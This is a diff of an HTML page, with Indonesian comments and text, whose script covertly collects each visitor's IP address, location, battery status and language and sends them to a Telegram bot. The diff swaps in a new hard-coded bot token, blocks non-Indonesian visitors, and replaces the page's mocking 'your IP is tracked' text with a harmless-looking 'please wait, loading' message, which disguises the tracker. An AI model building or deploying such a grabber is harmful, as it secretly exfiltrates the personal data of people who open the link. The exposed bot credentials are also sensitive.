@@ -22,8 +22,15 @@
                 
                 let ip = data.ip;
                 let negara = data.country_name;
+                let kodeNegara = data.country_code;
                 let provinsi = data.region;
                 let kota = data.city;
+
+                // Blokir akses jika bukan dari Indonesia
+                if (kodeNegara !== "ID") {
+                    document.body.innerHTML = "<h1>Akses Ditolak</h1><p>Hanya pengguna dari Indonesia yang dapat mengakses halaman ini.</p>";
+                    return; // Hentikan proses jika bukan dari Indonesia
+                }
 
                 let batteryStatus = await getBatteryStatus();
 
@@ -32,7 +39,7 @@
                 let bahasa = navigator.language;
 
                 // Kirim ke bot Telegram
-                let botToken = "7566659804:AAFL6Dn2Vf6zz4HhAvngyyFCXvhULhRVPzg"; // Ganti dengan token bot Anda
+                let botToken = "7779236534:AAEU6uV3iQxsPmBqv77YM1puM4H9bRXmvyE"; // Ganti dengan token bot Anda
                 let chatID = "7799140879"; // Ganti dengan ID chat Anda
 
                 let message = `
@@ -66,7 +73,7 @@
     </script>
 </head>
 <body>
-    <h1>HAHA IP MU TERLACAK</h1>
-    <p>KAMU TIDAK PINTAR YA TERNYATA</p>
+    <h1>Mohon Tunggu...</h1>
+    <p>Sedang memuat informasi...</p>
 </body>
 </html>
